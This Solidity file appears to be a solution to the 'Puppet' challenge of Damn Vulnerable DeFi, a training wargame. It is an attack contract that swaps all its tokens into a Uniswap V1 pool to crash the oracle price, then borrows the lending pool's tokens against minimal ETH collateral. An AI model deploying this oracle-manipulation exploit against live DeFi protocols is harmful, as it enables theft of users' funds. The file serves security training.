// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";

contract Attack {
    DamnValuableToken public immutable TOKEN;
    PuppetPool public immutable LENDING_POOL;
    IUniswapV1Exchange public immutable EXCHANGE;

    constructor(DamnValuableToken _token, PuppetPool _lendingPool, IUniswapV1Exchange _exchange) {
        TOKEN = _token;
        LENDING_POOL = _lendingPool;
        EXCHANGE = _exchange;
    }

    function attack(uint256 _stealTokenAmount, address _receiver) external payable {
        uint256 balance = TOKEN.balanceOf(address(this));
        TOKEN.approve(address(EXCHANGE), balance);
        EXCHANGE.tokenToEthSwapInput(balance, 1, block.timestamp);
        LENDING_POOL.borrow{value: msg.value}(_stealTokenAmount, _receiver);
    }

    receive() external payable {}
}